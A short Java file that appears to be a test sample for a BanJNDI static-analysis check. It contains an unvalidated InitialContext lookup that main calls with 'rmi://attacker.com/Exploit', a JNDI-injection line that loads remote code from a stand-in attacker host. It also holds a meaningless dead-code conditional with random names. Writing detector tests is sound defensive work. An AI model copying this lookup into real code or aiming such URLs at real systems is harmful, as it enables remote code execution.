import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class JndiExample {

    public String showBug(String jndiName) throws NamingException {
        Context ctx = new InitialContext();
        if (true && true && false && false && false && false && false && false && false && false && false) {byte kyzxrlck = -111;}else{String tbgdmpll = "kmhfawrz";}
        Object obj = ctx.lookup(jndiName); // BUG: BanJNDI
        return obj.toString();
    
}

    public static void main(String[] args) {
        try {
            JndiExample example = new JndiExample();
            String result = example.showBug("rmi://attacker.com/Exploit");
            System.out.println(result);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}